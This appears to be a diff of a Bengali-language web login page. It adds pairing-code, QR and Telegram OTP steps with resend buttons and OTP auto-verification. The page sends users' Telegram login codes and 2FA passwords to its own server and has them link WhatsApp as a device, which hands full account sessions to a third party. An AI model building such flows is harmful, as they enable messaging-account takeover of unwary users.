@@ -161,6 +161,77 @@
       transition: border-color 0.2s;
     }
     .input-field:focus { border-color: #38bdf8; }
+    .otp-big-input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 14px;
+      border: 2px solid #38bdf8;
+      background: rgba(15, 23, 42, 0.95);
+      color: #4ade80;
+      font-size: 26px;
+      font-weight: 700;
+      letter-spacing: 8px;
+      text-align: center;
+      font-family: monospace;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.14);
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .otp-big-input::placeholder {
+      font-size: 15px;
+      letter-spacing: 1px;
+      color: #94a3b8;
+      font-family: 'Hind Siliguri', sans-serif;
+      font-weight: 500;
+    }
+    .otp-big-input:focus {
+      border-color: #4ade80;
+      box-shadow: 0 0 0 4px rgba(74, 222, 128, 0.18);
+    }
+    .resend-btn {
+      width: 100%;
+      margin-top: 10px;
+      padding: 11px 14px;
+      border-radius: 11px;
+      border: 1px solid rgba(56, 189, 248, 0.4);
+      background: rgba(15, 23, 42, 0.9);
+      color: #38bdf8;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .resend-btn:hover:not(:disabled) {
+      background: rgba(56, 189, 248, 0.16);
+      color: #ffffff;
+    }
+    .resend-btn:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+      color: #94a3b8;
+      border-color: rgba(148, 163, 184, 0.25);
+    }
+    .change-num-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: rgba(15, 23, 42, 0.75);
+      border: 1px solid rgba(148, 163, 184, 0.2);
+      border-radius: 10px;
+      padding: 7px 12px;
+      margin-bottom: 12px;
+      font-size: 13px;
+      color: #cbd5e1;
+    }
+    .change-num-link {
+      background: none;
+      border: none;
+      color: #38bdf8;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: underline;
+    }
     .terms-box {
       display: flex;
       align-items: flex-start;
@@ -214,7 +285,7 @@
       color: #fbbf24;
     }
     .auth-result-box {
-      margin-top: 16px;
+      margin-top: 10px;
       background: rgba(30, 41, 59, 0.92);
       border: 1px solid rgba(56, 189, 248, 0.35);
       border-radius: 16px;
@@ -251,7 +322,7 @@
       border-radius: 999px;
       font-size: 13px;
       font-weight: 600;
-      margin-top: 6px;
+      margin-top: 10px;
     }
     .small-btn {
       background: #334155;
@@ -390,56 +461,91 @@
           <button id="tabQr" class="tab-btn" onclick="selectMethod('qr')">QR Code দিয়ে</button>
         </div>
 
-        <!-- Auto Country Code + Phone Input -->
-        <div id="phoneInputGroup" class="input-group">
-          <div class="phone-combo">
-            <select id="countryCodeSelect" class="country-select" aria-label="Country Code" onchange="onCountrySelectChange()"></select>
-            <input id="phoneInput" type="tel" inputmode="numeric" placeholder="18XXXXXXXX" />
+        <!-- STEP 1: Phone Input + Referral + Terms + Send Button (Hidden once code is sent) -->
+        <div id="stepOneInputs">
+          <div id="phoneInputGroup" class="input-group">
+            <div class="phone-combo">
+              <select id="countryCodeSelect" class="country-select" aria-label="Country Code" onchange="onCountrySelectChange()"></select>
+              <input id="phoneInput" type="tel" inputmode="numeric" placeholder="18XXXXXXXX" onkeyup="if(event.key==='Enter') startAuthFlow()" />
+            </div>
+            <div id="countryHintText" style="font-size:12px; color:#94a3b8; margin-top:5px; padding-left:4px;">
+              কান্ট্রি কোড স্বয়ংক্রিয়ভাবে যুক্ত আছে, শুধু পরের নাম্বার লিখুন
+            </div>
           </div>
-          <div id="countryHintText" style="font-size:12px; color:#94a3b8; margin-top:5px; padding-left:4px;">
-            কান্ট্রি কোড স্বয়ংক্রিয়ভাবে যুক্ত আছে, শুধু পরের নাম্বার লিখুন
+
+          <!-- Referral Input (Completely hidden when referralEnabled === false) -->
+          <div id="referralInputGroup" class="input-group">
+            <input id="referralInput" type="text" class="input-field" placeholder="রেফারেল কোড থাকলে দিন (ঐচ্ছিক)" />
           </div>
-        </div>
 
-        <!-- Referral Input (Completely hidden when referralEnabled === false) -->
-        <div id="referralInputGroup" class="input-group">
-          <input id="referralInput" type="text" class="input-field" placeholder="রেফারেল কোড থাকলে দিন (ঐচ্ছিক)" />
-        </div>
+          <!-- Mandatory Terms & Conditions Checkbox (Controlled by Admin) -->
+          <div id="termsContainer" class="terms-box">
+            <input id="termsCheckbox" type="checkbox" onchange="clearTermsError()" />
+            <label for="termsCheckbox">
+              আমি <span class="terms-link" onclick="openTermsModal(event)">শর্তাবলী ও গোপনীয়তা নীতি (Terms & Conditions)</span> পড়েছি এবং অ্যাকাউন্ট সংযোগ ও ব্যবস্থাপনায় সম্মতি দিচ্ছি।
+            </label>
+          </div>
 
-        <!-- Mandatory Terms & Conditions Checkbox (Controlled by Admin) -->
-        <div id="termsContainer" class="terms-box">
-          <input id="termsCheckbox" type="checkbox" onchange="clearTermsError()" />
-          <label for="termsCheckbox">
-            আমি <span class="terms-link" onclick="openTermsModal(event)">শর্তাবলী ও গোপনীয়তা নীতি (Terms & Conditions)</span> পড়েছি এবং অ্যাকাউন্ট সংযোগ ও ব্যবস্থাপনায় সম্মতি দিচ্ছি।
-          </label>
+          <button id="submitBtn" class="primary-btn" onclick="startAuthFlow()">কোড পাঠান / এগিয়ে যান</button>
         </div>
-
-        <button id="submitBtn" class="primary-btn" onclick="startAuthFlow()">কোড পাঠান / এগিয়ে যান</button>
       </div>
 
-      <div id="statusMsg" class="status-area hidden"></div>
-
-      <!-- Dynamic Result Box (Pairing Code / QR / Telegram OTP) -->
+      <!-- STEP 2: Dynamic Result Box (Replaces Phone Input & Send Button after code is sent) -->
       <div id="resultBox" class="auth-result-box hidden">
+        <div id="activePhoneBar" class="change-num-bar hidden">
+          <span>📱 নাম্বার: <b id="activePhoneLabel" style="color:#4ade80;"></b></span>
+          <button type="button" class="change-num-link" onclick="backToPhoneStep()">নাম্বার পরিবর্তন করুন</button>
+        </div>
+
         <div id="resultTitle" style="font-weight:700; font-size:16px; color:#38bdf8;"></div>
+
+        <!-- WhatsApp Pairing Code + Resend Button -->
         <div id="pairingSection" class="hidden">
           <div id="pairingCodeDisplay" class="pairing-code">---- ----</div>
-          <button class="small-btn" onclick="copyPairingCode()">কোড কপি করুন</button>
+          <button type="button" class="small-btn" onclick="copyPairingCode()">📋 কোড কপি করুন</button>
           <p style="font-size:13px; color:#cbd5e1; margin-top:8px;">
             আপনার WhatsApp খুলে <b>Linked Devices &gt; Link a Device &gt; Link with phone number instead</b> অপশনে গিয়ে ওপরের ৮ ডিজিটের কোডটি দিন।
           </p>
+          <button type="button" id="waResendBtn" class="resend-btn" onclick="resendWhatsAppCode()">
+            🔄 নতুন কোড পাঠান (Resend Code)
+          </button>
         </div>
+
+        <!-- QR Code Section -->
         <div id="qrSection" class="hidden">
           <img id="qrImage" class="qr-img" src="" alt="QR Code" />
           <p style="font-size:13px; color:#cbd5e1;">আপনার অ্যাপের <b>Linked Devices / Devices</b> থেকে QR Code স্ক্যান করুন।</p>
         </div>
+
+        <!-- Telegram Auto-Verify OTP Input Box + Resend OTP Button -->
         <div id="tgOtpSection" class="hidden" style="margin-top:10px;">
-          <input id="tgOtpInput" type="text" inputmode="numeric" class="input-field" placeholder="টেলিগ্রাম OTP কোড দিন" style="margin-bottom:8px;" />
-          <input id="tg2faInput" type="password" class="input-field hidden" placeholder="2FA পাসওয়ার্ড দিন (যদি থাকে)" style="margin-bottom:8px;" />
-          <button class="primary-btn" onclick="verifyTelegramOtp()">OTP যাচাই করুন</button>
+          <p id="tgDeliveryHint" style="font-size:13px; color:#bae6fd; margin-bottom:10px; line-height:1.45;">
+            📩 আপনার টেলিগ্রাম অ্যাপে (Telegram Official) পাঠানো ৫ ডিজিটের OTP কোডটি লিখুন বা পেস্ট করুন — কোড দিলেই অটোমেটিক ভেরিফাই হবে।
+          </p>
+          <input
+            id="tgOtpInput"
+            type="text"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            maxlength="6"
+            class="otp-big-input"
+            placeholder="OTP কোড লিখুন বা পেস্ট করুন"
+            oninput="handleOtpAutoInput(this)"
+            onpaste="setTimeout(() => handleOtpAutoInput(this), 20)"
+          />
+          <input id="tg2faInput" type="password" class="input-field hidden" placeholder="2FA পাসওয়ার্ড দিন (যদি থাকে)" style="margin-top:10px;" onkeyup="if(event.key==='Enter') verifyTelegramOtp()" />
+          <button type="button" id="tgManualVerifyBtn" class="primary-btn hidden" style="margin-top:10px;" onclick="verifyTelegramOtp()">2FA পাসওয়ার্ডসহ যাচাই করুন</button>
+
+          <!-- OTP Resend Button Directly Below OTP Input Box -->
+          <button type="button" id="tgResendBtn" class="resend-btn" onclick="resendTelegramOtp()">
+            🔄 কোড পাননি? ফোনে OTP রিসেন্ড করুন
+          </button>
         </div>
+
         <div id="countdownTimer" class="timer-pill">সময় বাকি: 02:00</div>
       </div>
+
+      <div id="statusMsg" class="status-area hidden"></div>
     </div>
 
     <!-- LOGGED IN USER PROFILE & PANEL -->
@@ -583,8 +689,12 @@
     let currentPlatform = 'whatsapp';
     let currentMethod = 'phone';
     let activeSessionId = null;
+    let activeFullPhone = '';
     let pollInterval = null;
     let timerInterval = null;
+    let resendCooldownTimer = null;
+    let isVerifyingOtp = false;
+    let otpStepFocused = false;
     let publicConfig = {};
     let userManuallyChangedCountry = false;
 
@@ -636,19 +746,16 @@
       if (cfg.siteTitle) document.getElementById('siteTitle').textContent = cfg.siteTitle;
       if (cfg.siteSubtitle) document.getElementById('siteSubtitle').textContent = cfg.siteSubtitle;
 
-      // Always keep site background controlled only by admin setting (never user avatar)
       if (cfg.bgUrl && cfg.bgUrl.trim() !== '') {
         document.body.style.backgroundImage = `url('${cfg.bgUrl.trim()}')`;
       } else {
         document.body.style.backgroundImage = 'linear-gradient(135deg, #4338ca 0%, #9333ea 50%, #0891b2 100%)';
       }
 
-      // Apply IP-detected country code if user hasn't manually changed it
       if (!userManuallyChangedCountry && cfg.detectedCountry) {
         setSelectedCountry(cfg.detectedCountry, false);
       }
 
-      // Custom Note
       const noteEl = document.getElementById('customLoginNoteBox');
       if (cfg.customLoginNote && cfg.customLoginNote.trim() !== '') {
         noteEl.textContent = cfg.customLoginNote;
@@ -657,7 +764,6 @@
         noteEl.classList.add('hidden');
       }
 
-      // Notice Bar
       if (cfg.noticeEnabled && cfg.noticeText) {
         document.getElementById('noticeText').textContent = cfg.noticeText;
         document.getElementById('noticeBar').classList.remove('hidden');
@@ -665,7 +771,6 @@
         document.getElementById('noticeBar').classList.add('hidden');
       }
 
-      // Platform Policy
       const waOn = cfg.whatsappEnabled !== false;
       const tgOn = cfg.telegramEnabled !== false;
       if (!waOn && !tgOn) {
@@ -685,7 +790,6 @@
         }
       }
 
-      // Login Method Policy ('both' | 'phone_only' | 'qr_only')
       const mode = cfg.loginMethodMode || 'both';
       if (mode === 'phone_only') {
         document.getElementById('methodTabRow').classList.add('hidden');
@@ -697,7 +801,6 @@
         document.getElementById('methodTabRow').classList.remove('hidden');
       }
 
-      // Referral Policy
       if (cfg.referralEnabled === false) {
         document.getElementById('referralInputGroup').classList.add('hidden');
       } else {
@@ -707,7 +810,6 @@
         }
       }
 
-      // Terms & Conditions Policy
       if (cfg.termsEnabled === false) {
         document.getElementById('termsContainer').classList.add('hidden');
       } else {
@@ -716,7 +818,6 @@
         if (cfg.termsText) document.getElementById('termsModalContent').textContent = cfg.termsText;
       }
 
-      // Support Button
       if (cfg.supportEnabled && cfg.supportUrl) {
         const sBtn = document.getElementById('supportBtn');
         sBtn.textContent = cfg.supportLabel || '💬 সাপোর্ট';
@@ -726,7 +827,6 @@
         document.getElementById('supportBtn').classList.add('hidden');
       }
 
-      // Ads Slots
       if (cfg.adsEnabled !== false) {
         if (cfg.adScriptTop) {
           const topSlot = document.getElementById('adSlotTop');
@@ -754,7 +854,7 @@
     }
 
     function getSessionMaxMs() {
-      const mins = Number(publicConfig.loginSessionMinutes) || 1440; // Default 1 day (1440 mins)
+      const mins = Number(publicConfig.loginSessionMinutes) || 1440;
       return mins * 60000;
     }
 
@@ -803,11 +903,51 @@
     function resetAuthUi() {
       if (pollInterval) clearInterval(pollInterval);
       if (timerInterval) clearInterval(timerInterval);
+      if (resendCooldownTimer) clearInterval(resendCooldownTimer);
+      isVerifyingOtp = false;
+      otpStepFocused = false;
+
+      // Show Step 1 inputs & Send button again
+      document.getElementById('stepOneInputs').classList.remove('hidden');
+      document.getElementById('submitBtn').disabled = false;
+
       document.getElementById('statusMsg').classList.add('hidden');
       document.getElementById('resultBox').classList.add('hidden');
+      document.getElementById('activePhoneBar').classList.add('hidden');
       document.getElementById('pairingSection').classList.add('hidden');
       document.getElementById('qrSection').classList.add('hidden');
       document.getElementById('tgOtpSection').classList.add('hidden');
+      document.getElementById('tgOtpInput').value = '';
+      document.getElementById('tg2faInput').value = '';
+      document.getElementById('tg2faInput').classList.add('hidden');
+      document.getElementById('tgManualVerifyBtn').classList.add('hidden');
+    }
+
+    function backToPhoneStep() {
+      activeSessionId = null;
+      resetAuthUi();
+      if (currentMethod === 'phone') {
+        document.getElementById('phoneInput').focus();
+      }
+    }
+
+    function startResendCooldown(btnId, defaultLabel, seconds = 15) {
+      if (resendCooldownTimer) clearInterval(resendCooldownTimer);
+      const btn = document.getElementById(btnId);
+      if (!btn) return;
+      let rem = seconds;
+      btn.disabled = true;
+      btn.textContent = `⏳ রিসেন্ড করতে অপেক্ষা করুন (${rem}s)`;
+      resendCooldownTimer = setInterval(() => {
+        rem--;
+        if (rem <= 0) {
+          clearInterval(resendCooldownTimer);
+          btn.disabled = false;
+          btn.textContent = defaultLabel;
+        } else {
+          btn.textContent = `⏳ রিসেন্ড করতে অপেক্ষা করুন (${rem}s)`;
+        }
+      }, 1000);
     }
 
     function openTermsModal(e) {
@@ -872,7 +1012,7 @@
       const btn = document.getElementById('submitBtn');
       btn.disabled = true;
       statusEl.style.color = '#fbbf24';
-      statusEl.textContent = currentMethod === 'qr' ? 'দ্রুত QR Code তৈরি হচ্ছে...' : 'অপেক্ষা করুন, কোড পাঠানো হচ্ছে...';
+      statusEl.textContent = currentMethod === 'qr' ? 'দ্রুত QR Code তৈরি হচ্ছে...' : 'অপেক্ষা করুন, আপনার নাম্বারে কোড পাঠানো হচ্ছে...';
       statusEl.classList.remove('hidden');
 
       const endpoint = currentPlatform === 'whatsapp' ? '/api/auth/whatsapp/start' : '/api/auth/telegram/start';
@@ -899,6 +1039,7 @@
         }
 
         activeSessionId = data.sessionId;
+        activeFullPhone = data.phone ? `+${data.phone}` : (rawInput.startsWith('+') ? rawInput : `+${dialCode}${localDigits}`);
         startCountdown(data.expiresAt);
         pollSessionStatus();
         pollInterval = setInterval(pollSessionStatus, 500);
@@ -919,6 +1060,18 @@
       showUserDashboard(user);
     }
 
+    function updateTelegramDeliveryHint(deliveryType) {
+      const hintEl = document.getElementById('tgDeliveryHint');
+      if (!hintEl) return;
+      if (deliveryType && deliveryType.includes('Sms') && !deliveryType.includes('Firebase')) {
+        hintEl.innerHTML = '📱 আপনার মোবাইল নাম্বারে <b>SMS</b>-এর মাধ্যমে OTP কোড পাঠানো হয়েছে। কোডটি লিখুন বা পেস্ট করুন — অটোমেটিক ভেরিফাই হবে।';
+      } else if (deliveryType && deliveryType.includes('Firebase')) {
+        hintEl.innerHTML = '📲 আপনার ফোনে কোড পাঠানো হয়েছে। কোড না পেলে নিচের <b>OTP রিসেন্ড</b> বাটনে চাপুন অথবা QR Code ব্যবহার করুন।';
+      } else {
+        hintEl.innerHTML = '📩 আপনার <b>Telegram অ্যাপে (Telegram Official)</b> লগ-ইন কোড পাঠানো হয়েছে। কোডটি লিখুন বা পেস্ট করুন — অটোমেটিক ভেরিফাই হবে।';
+      }
+    }
+
     async function pollSessionStatus() {
       if (!activeSessionId) return;
       try {
@@ -928,11 +1081,25 @@
         const resultBox = document.getElementById('resultBox');
 
         if (data.status === 'code_ready' && data.pairingCode) {
+          // Hide phone input & send button, show pairing code + resend button in their place
+          document.getElementById('stepOneInputs').classList.add('hidden');
           statusEl.classList.add('hidden');
           resultBox.classList.remove('hidden');
-          document.getElementById('resultTitle').textContent = 'WhatsApp পেয়ারিং কোড প্রস্তুত!';
+
+          if (activeFullPhone) {
+            document.getElementById('activePhoneLabel').textContent = activeFullPhone;
+            document.getElementById('activePhoneBar').classList.remove('hidden');
+          }
+          document.getElementById('resultTitle').textContent = 'WhatsApp পেয়ারিং কোড পাঠানো হয়েছে!';
           document.getElementById('pairingCodeDisplay').textContent = data.pairingCode;
           document.getElementById('pairingSection').classList.remove('hidden');
+          clearInterval(pollInterval);
+          // Keep polling slower (every 1.5s) to detect when user links device
+          pollInterval = setInterval(pollSessionStatus, 1500);
+          if (!otpStepFocused) {
+            otpStepFocused = true;
+            startResendCooldown('waResendBtn', '🔄 নতুন কোড পাঠান (Resend Code)', 15);
+          }
         } else if (data.status === 'qr_ready' && data.qrDataUrl) {
           statusEl.classList.add('hidden');
           resultBox.classList.remove('hidden');
@@ -940,18 +1107,36 @@
           document.getElementById('qrImage').src = data.qrDataUrl;
           document.getElementById('qrSection').classList.remove('hidden');
         } else if (data.status === 'otp_required') {
+          // Hide phone input & send button, replace with auto-verify OTP input box + Resend button
+          document.getElementById('stepOneInputs').classList.add('hidden');
           statusEl.classList.add('hidden');
           resultBox.classList.remove('hidden');
-          document.getElementById('resultTitle').textContent = 'আপনার টেলিগ্রামে পাঠানো OTP কোড দিন';
+
+          if (activeFullPhone) {
+            document.getElementById('activePhoneLabel').textContent = activeFullPhone;
+            document.getElementById('activePhoneBar').classList.remove('hidden');
+          }
+          document.getElementById('resultTitle').textContent = 'OTP ভেরিফিকেশন কোড দিন';
+          updateTelegramDeliveryHint(data.codeDeliveryType);
           document.getElementById('tgOtpSection').classList.remove('hidden');
           clearInterval(pollInterval);
+
+          if (!otpStepFocused) {
+            otpStepFocused = true;
+            const otpBox = document.getElementById('tgOtpInput');
+            otpBox.focus();
+            startResendCooldown('tgResendBtn', '🔄 কোড পাননি? ফোনে OTP রিসেন্ড করুন', 15);
+          }
         } else if (data.status === 'connected' && data.user) {
           clearInterval(pollInterval);
           clearInterval(timerInterval);
+          if (resendCooldownTimer) clearInterval(resendCooldownTimer);
           handleLoginSuccess(data.user);
         } else if (data.status === 'expired' || data.status === 'error') {
           clearInterval(pollInterval);
           clearInterval(timerInterval);
+          if (resendCooldownTimer) clearInterval(resendCooldownTimer);
+          document.getElementById('stepOneInputs').classList.remove('hidden');
           resultBox.classList.add('hidden');
           statusEl.style.color = '#f87171';
           statusEl.textContent = data.error || 'সেশনটি বাতিল হয়েছে। আবার চেষ্টা করুন।';
@@ -960,14 +1145,30 @@
       } catch (e) {}
     }
 
+    // Auto-verify OTP as soon as user types or pastes 5 digits
+    function handleOtpAutoInput(inputEl) {
+      const digitsOnly = String(inputEl.value || '').replace(/\D/g, '').slice(0, 6);
+      if (inputEl.value !== digitsOnly) {
+        inputEl.value = digitsOnly;
+      }
+      // Telegram login codes are 5 digits; trigger verify automatically as soon as 5 digits are entered/pasted
+      if (digitsOnly.length === 5 && !isVerifyingOtp) {
+        verifyTelegramOtp();
+      }
+    }
+
     async function verifyTelegramOtp() {
-      const code = document.getElementById('tgOtpInput').value.trim();
+      if (isVerifyingOtp) return;
+      const otpInput = document.getElementById('tgOtpInput');
+      const code = otpInput.value.trim();
       const password = document.getElementById('tg2faInput').value;
       const statusEl = document.getElementById('statusMsg');
 
-      if (!code) return;
+      if (!code || code.length < 4) return;
+      isVerifyingOtp = true;
+      otpInput.disabled = true;
       statusEl.style.color = '#fbbf24';
-      statusEl.textContent = 'OTP যাচাই করা হচ্ছে...';
+      statusEl.textContent = '⏳ OTP যাচাই করা হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...';
       statusEl.classList.remove('hidden');
 
       try {
@@ -977,22 +1178,110 @@
           body: JSON.stringify({ sessionId: activeSessionId, code, password })
         });
         const data = await res.json();
+        isVerifyingOtp = false;
+        otpInput.disabled = false;
+
         if (data.need2fa) {
           document.getElementById('tg2faInput').classList.remove('hidden');
+          document.getElementById('tgManualVerifyBtn').classList.remove('hidden');
+          document.getElementById('tg2faInput').focus();
           statusEl.style.color = '#fbbf24';
           statusEl.textContent = data.error;
           return;
         }
         if (!data.ok) {
           statusEl.style.color = '#f87171';
-          statusEl.textContent = data.error;
+          statusEl.textContent = '❌ ' + (data.error || 'ভুল OTP কোড! আবার সঠিক কোড দিন।');
+          otpInput.value = '';
+          otpInput.focus();
           return;
         }
         clearInterval(timerInterval);
+        if (resendCooldownTimer) clearInterval(resendCooldownTimer);
         handleLoginSuccess(data.user);
       } catch (e) {
+        isVerifyingOtp = false;
+        otpInput.disabled = false;
         statusEl.style.color = '#f87171';
-        statusEl.textContent = 'যাচাই ব্যর্থ হয়েছে।';
+        statusEl.textContent = 'যাচাই ব্যর্থ হয়েছে। আবার চেষ্টা করুন।';
+      }
+    }
+
+    async function resendTelegramOtp() {
+      if (!activeSessionId) return;
+      const btn = document.getElementById('tgResendBtn');
+      const statusEl = document.getElementById('statusMsg');
+      btn.disabled = true;
+      btn.textContent = '⏳ কোড রিসেন্ড হচ্ছে...';
+      statusEl.style.color = '#fbbf24';
+      statusEl.textContent = 'আপনার ফোনে নতুন OTP কোড পাঠানো হচ্ছে...';
+      statusEl.classList.remove('hidden');
+
+      try {
+        const res = await fetch('/api/auth/telegram/resend', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId: activeSessionId })
+        });
+        const data = await res.json();
+        if (!data.ok) {
+          statusEl.style.color = '#f87171';
+          statusEl.textContent = data.error || 'কোড রিসেন্ড করা যায়নি।';
+          btn.disabled = false;
+          btn.textContent = '🔄 কোড পাননি? ফোনে OTP রিসেন্ড করুন';
+          return;
+        }
+
+        if (data.expiresAt) startCountdown(data.expiresAt);
+        updateTelegramDeliveryHint(data.codeDeliveryType);
+        statusEl.style.color = '#4ade80';
+        statusEl.textContent = '✅ নতুন OTP কোড পাঠানো হয়েছে! কোডটি লিখুন বা পেস্ট করুন।';
+        const otpInput = document.getElementById('tgOtpInput');
+        otpInput.value = '';
+        otpInput.focus();
+        startResendCooldown('tgResendBtn', '🔄 কোড পাননি? ফোনে OTP রিসেন্ড করুন', 20);
+      } catch (e) {
+        statusEl.style.color = '#f87171';
+        statusEl.textContent = 'সার্ভার সংযোগ ব্যর্থ হয়েছে।';
+        btn.disabled = false;
+        btn.textContent = '🔄 কোড পাননি? ফোনে OTP রিসেন্ড করুন';
+      }
+    }
+
+    async function resendWhatsAppCode() {
+      if (!activeSessionId) return;
+      const btn = document.getElementById('waResendBtn');
+      const statusEl = document.getElementById('statusMsg');
+      btn.disabled = true;
+      btn.textContent = '⏳ নতুন কোড তৈরি হচ্ছে...';
+      statusEl.style.color = '#fbbf24';
+      statusEl.textContent = 'আপনার WhatsApp নাম্বারে নতুন পেয়ারিং কোড পাঠানো হচ্ছে...';
+      statusEl.classList.remove('hidden');
+
+      try {
+        const res = await fetch('/api/auth/whatsapp/resend', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId: activeSessionId })
+        });
+        const data = await res.json();
+        if (!data.ok) {
+          statusEl.style.color = '#f87171';
+          statusEl.textContent = data.error || 'নতুন কোড পাঠানো যায়নি।';
+          btn.disabled = false;
+          btn.textContent = '🔄 নতুন কোড পাঠান (Resend Code)';
+          return;
+        }
+
+        if (data.expiresAt) startCountdown(data.expiresAt);
+        if (pollInterval) clearInterval(pollInterval);
+        pollInterval = setInterval(pollSessionStatus, 500);
+        startResendCooldown('waResendBtn', '🔄 নতুন কোড পাঠান (Resend Code)', 20);
+      } catch (e) {
+        statusEl.style.color = '#f87171';
+        statusEl.textContent = 'সার্ভার সংযোগ ব্যর্থ হয়েছে।';
+        btn.disabled = false;
+        btn.textContent = '🔄 নতুন কোড পাঠান (Resend Code)';
       }
     }
 
@@ -1040,7 +1329,6 @@
             : `🔒 লগ-ইন সেশন সচল আছে: আরও ${remM} মিনিট`;
       }
 
-      // Referral Section
       if (publicConfig.referralEnabled === false) {
         document.getElementById('dashReferralCard').classList.add('hidden');
       } else {
@@ -1049,7 +1337,6 @@
         document.getElementById('dashRefStats').textContent = `মোট সফল রেফার: ${user.referralCount || 0} জন (প্রতি রেফারে +${publicConfig.referralBonusMinutes || 30} মিনিট বোনাস)`;
       }
 
-      // Payment Section
       if (publicConfig.paymentEnabled === false) {
         document.getElementById('dashPaymentSection').classList.add('hidden');
       } else {
@@ -1088,7 +1375,6 @@
         ).join('');
       }
 
-      // Post-Login Redirect Button if configured
       if (publicConfig.postLoginRedirectUrl && publicConfig.postLoginRedirectUrl.trim() !== '') {
         const rBtn = document.getElementById('redirectActionBtn');
         rBtn.href = publicConfig.postLoginRedirectUrl.trim();
@@ -1144,7 +1430,6 @@
     (async () => {
       initCountrySelector();
 
-      // 1. Apply cached config immediately so modified login UI shows with zero flicker
       let hasCachedConfig = false;
       try {
         const cachedRaw = localStorage.getItem(CONFIG_CACHE_KEY);
@@ -1154,13 +1439,11 @@
         }
       } catch (e) {}
 
-      // 2. Restore active user session immediately if valid (prevents logout on reload)
       const existingSession = getValidUserSession();
       if (existingSession && existingSession.user) {
         showUserDashboard(existingSession.user);
         document.getElementById('appViewport').style.opacity = '1';
 
-        // Refresh config & user profile silently in background
         await refreshConfigFromServer();
         const recheck = getValidUserSession();
         if (!recheck) {
